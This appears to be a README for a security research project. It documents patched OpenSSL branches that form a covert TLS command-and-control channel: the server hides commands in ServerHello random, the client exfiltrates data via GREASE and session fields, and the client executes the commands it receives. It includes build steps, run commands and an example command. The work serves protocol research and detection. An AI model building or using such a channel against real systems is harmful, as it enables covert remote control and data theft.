This is a personal research project, <br> not to be used outside of test environments.
==============================

The `OpenSSL_1_1_1-stable-research-exfil` branch was patched to allow a client to exfil data via GREASE (RFC 8701), random and session_id in clientHello. <br> 
`client.c` added to branch.<br>
The `openssl-3.5-research` branch was patched to allow a server to send commands to a client via random in serverHello. <br> 
`server.c` added to branch.<br>

<br>

**WHAT**

A client linked with 1.1.1 and a server linked with 3.5 can communicate via the CH-SH.<br>
A low throughput, noisy, conspicuous TLS C2 channel is achieved. <br>
<br>
This was developed for research purposes only.<br>
I do not condone its usage in any environments where you do not have explicit permission to operate.<br>
<br>
**HOW** 
<br>
**Windows client** 
1. Compile openssl 1.1.1 
```
> cd C:\openssl-1.1.1-source
> perl Configure VC-WIN64A no-shared --prefix=C:/openssl-grease --openssldir=C:/openssl-grease/ssl
> nmake clean
> nmake
> nmake install
```
2. Compile client.c and link with openssl 1.1.1 <br>
`> cl client.c /I C:\openssl-grease\include /link /LIBPATH:C:\openssl-grease\lib`
3. Run client<br>
`> client.exe <server_ip> 8787 -g -r -s`
***nix server**
1. Compile openssl 3.5-dev
```
$ cd openssl-3.5-source/
$ ./config --prefix=/opt/openssl-3.5 --openssldir=/opt/openssl-3.5
# make clean -j$(nproc)
# make -j$(nproc)
# make install -j$(nproc)
```
2. Compile server.c and link with openssl 3.5-dev <br>
`$ gcc server.c -o server -I /opt/openssl-3.5/include/ -I /home/openssl-3.5-source/include/ -L /opt/openssl-3.5/lib64/ -lssl -lcrypto -pthread`
3. Run server <br>
`$ ./server`
4. Send a command to the server after the prompt<br>
[+] enter a less than 32 bytes server_random: <br>
`ipconfig /all`
5. The client will receive the command, execute and send back the output to the server stdout and to a file <br>
6. If no commands are sent by the server, the client will check in every 3s. <br>
 <br>
Blogpost: [here](https://medium.com/@haarlems/tls-protocol-manipulation-a-very-low-throughput-c2-channel-24ac04bc6472) <br>
<br>
This was presented at DefCamp 2025.<br>
Slides: to come<br>
